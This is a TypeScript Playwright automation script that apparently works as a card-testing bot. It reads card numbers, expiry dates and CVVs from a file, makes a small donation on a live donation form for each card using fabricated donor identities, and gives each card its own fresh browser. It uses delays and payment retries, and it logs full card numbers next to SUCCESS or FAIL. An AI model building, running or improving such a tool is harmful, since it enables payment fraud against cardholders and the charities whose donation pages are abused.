import { chromium, Page } from 'playwright';
import * as fs from 'fs';
import * as path from 'path';
import { fileURLToPath } from 'url';
import { config } from './config';

// --- Configuration & Paths ---
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const ROOT_DIR = __dirname;
const DATA_DIR = path.join(ROOT_DIR, 'data');
const SCREENSHOTS_DIR = path.join(ROOT_DIR, 'screenshots', 'gateway2');
const LOG_FILE = path.join(DATA_DIR, 'gateway2_log.txt');
const RESULTS_FILE = path.join(DATA_DIR, 'gateway2_results.txt');
const CARDS_FILE = path.join(DATA_DIR, 'cards.txt');
const PROGRESS_FILE = path.join(DATA_DIR, 'gateway2_progress.txt');

// Ensure directories exist
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(SCREENSHOTS_DIR)) fs.mkdirSync(SCREENSHOTS_DIR, { recursive: true });

// --- Helper Functions ---

function logToFile(msg: string): void {
    const timestamp = new Date().toLocaleTimeString('en-GB', { hour12: false });
    const formatted = `[${timestamp}] ${msg}`;
    console.log(formatted);
    fs.appendFileSync(LOG_FILE, formatted + "\n");
}

async function safeFill(page: Page, selector: string, value: string, fieldName: string): Promise<boolean> {
    try {
        await page.waitForSelector(selector, { timeout: config.timeouts.waitForSelector });
        // Ensure field is cleared before filling
        await page.fill(selector, '');
        await page.fill(selector, value as string);
        logToFile(`[+] Filled ${fieldName}`);
        return true;
    } catch (e: any) {
        logToFile(`[!] Failed ${fieldName} (${selector}): ${e.message}`);
        return false;
    }
}

async function safeSelect(page: Page, selector: string, value: string, fieldName: string): Promise<boolean> {
    try {
        await page.waitForSelector(selector, { state: 'visible', timeout: config.timeouts.waitForSelector });
        
        // Try selecting by value or label using Playwright's built-in method
        try {
            await page.selectOption(selector, [
                { value: value },
                { label: value },
                { index: parseInt(value) || -1 }
            ].filter(o => o.value !== undefined || o.label !== undefined || (typeof o.index === 'number' && o.index >= 0)));
            
            // Explicitly dispatch change event after selection to be safe
            await page.dispatchEvent(selector, 'change', { bubbles: true });
            logToFile(`[+] Selected ${fieldName}: ${value}`);
            return true;
        } catch (e) {
            logToFile(`[!] Standard select failed for ${fieldName}, trying JS fallback...`);
            
            // Last resort: JS evaluation with more flexible matching
            const success = await page.evaluate(({ sel, val }) => {
                const el = document.querySelector(sel) as HTMLSelectElement;
                if (!el) return false;
                
                const normalizedVal = val.toString().trim().toLowerCase();
                
                // Try to find by value first (exact)
                for (let i = 0; i < el.options.length; i++) {
                    if (el.options[i].value.trim().toLowerCase() === normalizedVal) {
                        el.selectedIndex = i;
                        el.dispatchEvent(new Event('change', { bubbles: true }));
                        el.dispatchEvent(new Event('input', { bubbles: true }));
                        return true;
                    }
                }
                
                // Try to find by text/label (contains or exact)
                for (let i = 0; i < el.options.length; i++) {
                    const text = el.options[i].text.trim().toLowerCase();
                    if (text === normalizedVal || text.includes(normalizedVal)) {
                        el.selectedIndex = i;
                        el.dispatchEvent(new Event('change', { bubbles: true }));
                        el.dispatchEvent(new Event('input', { bubbles: true }));
                        return true;
                    }
                }
                
                return false;
            }, { sel: selector, val: value });
            
            if (success) {
                logToFile(`[+] Selected ${fieldName} (via JS fallback): ${value}`);
                return true;
            }
            throw new Error(`Could not find option with value or text matching: ${value}`);
        }
    } catch (e: any) {
        logToFile(`[!] Failed ${fieldName} (${selector}): ${e.message}`);
        return false;
    }
}

async function safeClick(page: Page, selector: string, buttonName: string): Promise<boolean> {
    try {
        await page.waitForSelector(selector, { timeout: config.timeouts.waitForClick });
        await page.click(selector, { force: true });
        logToFile(`[+] Clicked ${buttonName}`);
        return true;
    } catch (e: any) {
        logToFile(`[-] Failed ${buttonName} (${selector}): ${e.message}`);
        return false;
    }
}

// --- Test Data ---
const TEST_DONORS = [
    {
        first: "John",
        last: "Smith",
        address: "123 Main St",
        city: "New York",
        state: "NY",
        province: "",
        country: "USA",
        zip: "10001",
        email: "john.smith@email.com",
        phone: "(212) 555-0123",
        amount: 250.00,
        date: "2025-03-15"
    },
    {
        first: "Jane",
        last: "Doe",
        address: "456 Oak Ave",
        city: "Los Angeles",
        state: "CA",
        province: "",
        country: "USA",
        zip: "90001",
        email: "jane.doe@email.com",
        phone: "(310) 555-0456",
        amount: 100.00,
        date: "2025-04-02"
    },
    {
        first: "Bob",
        last: "Johnson",
        address: "789 Pine Rd",
        city: "Chicago",
        state: "IL",
        province: "",
        country: "USA",
        zip: "60601",
        email: "bob.johnson@email.com",
        phone: "(312) 555-0789",
        amount: 500.00,
        date: "2025-02-28"
    },
    // Additional diverse test donors
    {
        first: "Maria",
        last: "Garcia",
        address: "234 Sunset Blvd",
        city: "Miami",
        state: "FL",
        province: "",
        country: "USA",
        zip: "33101",
        email: "maria.garcia@email.com",
        phone: "(305) 555-1122",
        amount: 75.50,
        date: "2025-04-10"
    },
    {
        first: "David",
        last: "Chen",
        address: "567 Tech Way",
        city: "San Francisco",
        state: "CA",
        province: "",
        country: "USA",
        zip: "94105",
        email: "david.chen@email.com",
        phone: "(415) 555-3344",
        amount: 1000.00,
        date: "2025-03-22"
    },
    {
        first: "Aisha",
        last: "Patel",
        address: "890 Maple Lane",
        city: "Austin",
        state: "TX",
        province: "",
        country: "USA",
        zip: "73301",
        email: "aisha.patel@email.com",
        phone: "(512) 555-6677",
        amount: 150.25,
        date: "2025-04-05"
    },
    {
        first: "Michael",
        last: "Thompson",
        address: "345 River Rd",
        city: "Seattle",
        state: "WA",
        province: "",
        country: "USA",
        zip: "98101",
        email: "michael.thompson@email.com",
        phone: "(206) 555-8899",
        amount: 300.00,
        date: "2025-01-15"
    }
];

async function processForm(page: Page, cardLine: string, donor: any, index: number): Promise<string> {
    const parts = cardLine.split('|');
    if (parts.length < 3) return "SKIP";

    const cc = parts[0];
    const mm = parts[1].padStart(2, '0');
    const yy = parts[2];
    const cvv = parts.length > 3 ? parts[3] : "123";

    const url = config.form.url;
    logToFile(`Starting Run ${index}: ${cc.slice(-4)}`);

    try {
        await page.goto(url, { waitUntil: "domcontentloaded", timeout: config.timeouts.pageLoad });
        await page.waitForTimeout(3000); // Allow JS to initialize

        // 1. Amount & Type Selection
        await safeClick(page, config.selectors.otherAmountRadio, "Other Amount Radio");
        await page.waitForTimeout(1000); // Wait for input field to potentially appear/enable
        await safeFill(page, config.selectors.otherAmountInput, config.form.amount, "Other Amount Value");
        await safeClick(page, config.selectors.oneTimeGift, "One Time Donation");

        // 2. Donor Information
        await safeFill(page, config.selectors.firstName, donor.first, "First Name");
        await safeFill(page, config.selectors.lastName, donor.last, "Last Name");
        await safeFill(page, config.selectors.address, donor.address, "Address");
        await safeFill(page, config.selectors.city, donor.city, "City");
        
        // State selection
        await safeSelect(page, config.selectors.state, donor.state.toUpperCase(), "State");
        
        // Country selection
        await safeSelect(page, config.selectors.country, config.country.default, "Country");
        
        await safeFill(page, config.selectors.zip, donor.zip, "Zip");
        await safeFill(page, config.selectors.email, donor.email, "Email");

        // 4. Payment Details
        await safeFill(page, config.selectors.cardHolderName, `${donor.first} ${donor.last}`, "Card Holder Name");
        await safeFill(page, config.selectors.cardNumber, cc, "Card Number");
        
        // Expiry month/year
        await safeSelect(page, config.selectors.expiryMonth, mm, "Expiry Month");
        await safeSelect(page, config.selectors.expiryYear, yy, "Expiry Year");
        
        await safeFill(page, config.selectors.cvv, cvv, "CVV");

        // 5. Billing Details
        await safeClick(page, config.selectors.sameAsAbove, "Same as Above Checkbox");
        await safeFill(page, config.selectors.billingAddress, donor.address, "Billing Address");
        await safeFill(page, config.selectors.billingCity, donor.city, "Billing City");
        
        // Billing State/Country
        await safeSelect(page, config.selectors.billingState, donor.state.toUpperCase(), "Billing State");
        await safeSelect(page, config.selectors.billingCountry, config.country.default, "Billing Country");
        
        await safeFill(page, config.selectors.billingZip, donor.zip, "Billing Zip");

        // 6. Optional Contribution (Cover Costs)
        await safeClick(page, config.selectors.coverCosts, "Cover Costs Yes");

        // Screenshot before submit
        try {
            const preSubmitPath = path.join(SCREENSHOTS_DIR, `pre_submit_${index}.png`);
            await page.screenshot({ path: preSubmitPath });
            logToFile(`[+] Pre-submit screenshot: pre_submit_${index}.png`);
        } catch (e: any) {
            logToFile(`[!] Pre-submit screenshot failed: ${e.message}`);
        }

        // 7. Submit Process (Two-Step: Next -> Submit)
        let retryCount = 0;
        const maxRetries = 1;

        while (retryCount <= maxRetries) {
            logToFile(`[ ] Attempting submission (Attempt ${retryCount + 1})...`);
            
            if (retryCount === 0) {
                // Step 1: Click Next (only on first attempt, usually)
                const nextSuccess = await safeClick(page, config.selectors.nextBtn, "Next Button");
                if (!nextSuccess) {
                    logToFile(`[!] Primary Next button failed, trying fallback...`);
                    await safeClick(page, 'input[value="Next"], .btn-next, #btnConfirm12345', "Fallback Next");
                }
                
                logToFile(`[ ] Waiting for confirmation step/page load...`);
                await page.waitForLoadState('networkidle', { timeout: 15000 }).catch(() => {});
                await page.waitForTimeout(3000); // Additional safety buffer
            }

            // Step 2: Click final Submit/Process button
            logToFile(`[ ] Attempting final submission...`);
            const finalSubmitSuccess = await safeClick(page, config.selectors.submitBtn, "Final Submit Button");
            if (!finalSubmitSuccess) {
                logToFile(`[!] Final submit button not found or failed, trying broad fallback...`);
                await safeClick(page, 'input[value="Submit"], button:has-text("Submit"), input[value="Process"], button:has-text("Process"), #btnSubmit, .btn-primary', "Broad Fallback Submit");
            }

            logToFile(`[+] Submission performed, waiting for result...`);
            
            // Wait for potential page transition or error container
            await page.waitForLoadState('load', { timeout: 10000 }).catch(() => {});
            
            // 8. Error Detection & Retry Logic
            const errorSelector = (config.selectors as any).paymentErrorContainer || '#\\32';
            const errorElement = await page.$(errorSelector);
            let errorMessage = "";
            
            if (errorElement) {
                errorMessage = await errorElement.innerText();
                logToFile(`[!] Error container detected: ${errorMessage.slice(0, 100)}...`);
            }

            const targetError = "Sorry, there was an error processing the donation. Verify your payment details, try a different payment method, and try again.";
            
            if (errorMessage.includes(targetError) && retryCount < maxRetries) {
                logToFile(`[!] Payment error detected. Attempting retry...`);
                
                // Refill only payment fields
                logToFile(`[ ] Refilling payment fields in ${config.selectors.paymentSection}...`);
                await safeFill(page, config.selectors.cardNumber, cc, "Card Number (Retry)");
                await safeSelect(page, config.selectors.expiryMonth, mm, "Expiry Month (Retry)");
                await safeSelect(page, config.selectors.expiryYear, yy, "Expiry Year (Retry)");
                await safeFill(page, config.selectors.cvv, cvv, "CVV (Retry)");
                
                retryCount++;
                await page.waitForTimeout(2000);
                continue; // Loop back and click submit again
            }
            
            break; // Exit loop if no retryable error or max retries reached
        }

        // 8. Result Detection (Final)
        try {
            // Check if page closed immediately after submit
            if (page.isClosed()) {
                throw new Error("Page closed immediately after submission");
            }
            
            try {
                await page.waitForSelector("text=/thank you/i, text=/error/i, text=/declined/i, text=/success/i, text=/confirmed/i, text=/failed/i, text=/processor/i, text=/verify your payment details/i", { timeout: config.timeouts.resultWait });
            } catch (e: any) {
                logToFile(`[!] Timeout/Error waiting for result selector: ${e.message}`);
            }
        } catch (e: any) {
            logToFile(`[!] Result detection interrupted: ${e.message}`);
        }

        if (page.isClosed()) {
            logToFile(`[!] Cannot determine result: Page was closed.`);
            return "ERROR_CLOSED";
        }

        const currentUrl = page.url();
        const pageContent = (await page.content()).toLowerCase();

        let status = "UNKNOWN";
        const successKeywords = ["thank you", "success", "confirmed", "receipt", "transaction complete", "donation received"];
        const failKeywords = [
            "decline", "error", "invalid", "failed", "security code", "processor error", "rejected", "problem", "unable to process",
            "verify your payment details", "contact your card issuer", "try a different payment method"
        ];

        if (successKeywords.some(word => pageContent.includes(word))) {
            status = "SUCCESS";
        } else if (failKeywords.some(word => pageContent.includes(word))) {
            status = "FAIL";
        }

        if (status === "UNKNOWN") {
            logToFile(`[?] Result status UNKNOWN. URL: ${currentUrl}`);
            // Log a bit of page content for debugging
            const snippet = pageContent.replace(/\s+/g, ' ').substring(0, 500);
            logToFile(`[?] Page Snippet: ${snippet}`);
        }

        const screenshotName = `result_${cc.slice(-4)}_${Date.now()}.png`;
        try {
            if (!page.isClosed()) {
                await page.screenshot({ path: path.join(SCREENSHOTS_DIR, screenshotName), fullPage: true });
                logToFile(`[+] Result screenshot: ${screenshotName}`);
            } else {
                logToFile(`[!] Skipping result screenshot: Page closed.`);
            }
        } catch (e: any) {
            logToFile(`[!] Result screenshot failed: ${e.message}`);
        }

        const resultEntry = `${cc}|${status}|${screenshotName}|${new Date().toISOString()}\n`;
        fs.appendFileSync(RESULTS_FILE, resultEntry);

        logToFile(`Result ${index}: ${status} - URL: ${currentUrl}`);
        return status;

    } catch (e: any) {
        logToFile(`Error in Run ${index}: ${e.message}`);
        return "ERROR";
    }
}

async function main() {
    if (!fs.existsSync(CARDS_FILE)) {
        logToFile(`Cards file not found at ${CARDS_FILE}. Please create it.`);
        return;
    }

    logToFile("=== DonorPerfect Automation Started (TS) ===");

    const fileContent = fs.readFileSync(CARDS_FILE, 'utf-8');
    const lines = fileContent.split('\n').map(l => l.trim()).filter(l => l.length > 0);

    if (lines.length === 0) {
        logToFile("No cards to process.");
        return;
    }

    let currentIndex = 0;
    if (fs.existsSync(PROGRESS_FILE)) {
        try {
            currentIndex = parseInt(fs.readFileSync(PROGRESS_FILE, 'utf-8').trim());
        } catch {
            currentIndex = 0;
        }
    }

    while (currentIndex < lines.length) {
        const card = lines[currentIndex];
        const donor = TEST_DONORS[currentIndex % TEST_DONORS.length];

        // Launch fresh browser per card for maximum isolation
        const browser = await chromium.launch({ headless: true });
        const context = await browser.newContext();
        const page = await context.newPage();

        const status = await processForm(page, card, donor, currentIndex + 1);

        // Robust cleanup with try-catch
        try {
            await context.close();
        } catch (e: any) {
            logToFile(`[!] Context cleanup failed: ${e.message}`);
        }

        try {
            await browser.close();
        } catch (e: any) {
            logToFile(`[!] Browser cleanup failed: ${e.message}`);
        }

        currentIndex++;
        fs.writeFileSync(PROGRESS_FILE, currentIndex.toString());

        logToFile(`Progress: ${currentIndex}/${lines.length} (${status})`);

        if (currentIndex < lines.length) {
            await new Promise(resolve => setTimeout(resolve, config.timeouts.delayBetweenCards));
        }
    }

    if (fs.existsSync(PROGRESS_FILE)) fs.unlinkSync(PROGRESS_FILE);
    logToFile("=== Session Finished ===");
}

main().catch(err => {
    logToFile(`Critical Error: ${err.message}`);
});
